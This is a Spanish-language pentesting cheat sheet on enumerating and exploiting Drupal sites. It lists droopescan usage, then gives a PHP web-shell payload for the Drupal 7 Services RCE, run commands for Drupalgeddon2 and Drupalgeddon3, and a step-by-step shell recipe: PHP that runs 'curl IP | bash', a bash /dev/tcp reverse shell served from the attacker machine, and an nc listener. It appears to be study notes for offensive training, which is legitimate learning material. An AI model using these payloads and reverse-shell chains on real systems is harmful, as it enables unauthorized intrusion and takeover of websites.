# Drupal 

Tags: #Drupal #CMS #Ñ 

## Enumeración de gestores de contenido (CMS) – Drupal

Drupal ofrece un alto grado de personalización y escalabilidad, lo que lo convierte en una opción popular para sitios web complejos y grandes. Drupal se utiliza en una amplia gama de sitios web, desde blogs personales hasta sitios web gubernamentales y empresariales. Es altamente flexible y cuenta con una amplia variedad de módulos y herramientas que permiten a los usuarios personalizar su sitio web para satisfacer sus necesidades específicas.

Una de las herramientas que veremos en esta clase para enumerar un Drupal es la herramienta **droopescan**. Droopescan es una herramienta de escaneo de seguridad especializada en la identificación de versiones de Drupal y sus módulos, y en la detección de vulnerabilidades conocidas en ellos. La herramienta realiza un escaneo exhaustivo del sitio web para encontrar versiones de Drupal instaladas, módulos activos y vulnerabilidades conocidas, lo que ayuda a los administradores de sistemas y desarrolladores a identificar y solucionar los problemas de seguridad en sus sitios web.

Con esta herramienta, se pueden llevar a cabo análisis de seguridad en sitios web basados en Drupal, lo que puede ayudar a prevenir posibles ataques y problemas de seguridad en el futuro.

* [Drupal](https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600)

## Rutas típicas de Drupal en la web 

```bash 
/CHANGELOG.txt         # Muestra la versión e info de Drupal 
```

## Drupal Enumeración 

Esta herramienta además de enumerar un servidor Drupal

-   [Droopescan](https://github.com/SamJoan/droopescan)

```bash 
❯ droopescan scan drupal --url https://IP/
```

## Exploit PHP

```bash 
❯ Drupal 7.x Module Services - RCE

# Modificar los siguientes parametros dentro del script de PHP
1. URL
2. Verificar la ruta de 'rest' o 'rest_endpoint' en 'endpoint_path'
3. Colocar el payload de la siguiente manera en 'data' y cambiar el nombre al archivo de subida 'pwned.php':

	'<?php echo "<pre>" . shell_exec($_REQUEST[\'cmd\']) . "</pre>"; ' 
 
❯ php drupal_exploit.php             # Ejecutar el exploit 
❯ http://IP/pwned.php?cmd=whoami     # Ejecutar comandos en la web y generar una revershell 

Notas:
	1. Terminar el comando de PHP '?>'
```

## Drupalgeddon2 - RCE 

```bash 
# Funciona para las versiones 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x < 7.58 / < 6.x

# Instalar 
❯ gem install highline 

❯ ruby drupalgeddon2.rb http://IP     # Ejecutar el exploit para crear una shell 
```

## Drupalgeddon3 - RCE

```bash 
❯ git clone https://github.com/oways/SA-CORE-2018-004/tree/master      # Clonar el repositorio 

❯ python3 drupalgeddon3.py http://IP "SESSg135=gq34tw34g" 1 "whoami"

	# SESS = Es la 'session_name' y el 'session_id' obtenidas del drupalgeddon2 o al iniciar sessión con la cuenta del admin
	# 1 = Es un numero de nodo existente dentro de la web, este se obtiene dentro de la web en 'Content > Find Content' y al colocar el cursor encima de algun recurso mostrará un numero 


Nota:
	1. El script te ayudará a ejecutar comandos, por lo que se puede crear una revershell
```

## Obtener una Shell en Drupal 

```bash 
1. Dentro del CMS, crear un articulo y en el cuerpo escribir codigo php y para ejecutar el código se debe dar click en 'Preview'. 

	<?php 
		system("curl IP | bash ");


2. Se debe compartir y crear el archivo del recurso en la maquina Kali de la siguiente manera:
❯ python3 -m http.server 80

❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/IP/443 0>&1

❯ nc -nlvp 443    # Escuchar en el puerto para recibir la revershell 


Nota:
	1. Si en el articulo no sale la opción de 'PHP Code' se puede activar en 'Modules > Filter PHP' para que interprete el codigo de la revershell. 
	2. Terminar el comando de PHP '?>'
```